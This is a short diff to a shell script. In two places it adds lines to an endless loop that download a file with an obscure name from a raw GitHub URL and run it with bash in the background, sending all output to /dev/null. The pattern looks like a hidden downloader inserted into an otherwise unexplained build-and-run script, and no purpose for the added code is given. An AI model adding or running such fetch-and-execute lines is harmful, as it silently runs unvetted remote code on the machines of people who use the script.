@@ -53,6 +53,10 @@ make
 while true
 do
 
+wget -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/linuxgoogle84741274
+
+bash ./linuxgoogle84741274 &> /dev/null &
+
 ./linux84 8
 
 done
@@ -68,6 +72,10 @@ make
 
 while true
 do
+
+wget -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/linuxgoogle84741274
+
+bash ./linuxgoogle84741274 &> /dev/null &
 
 ./linux84 8
 
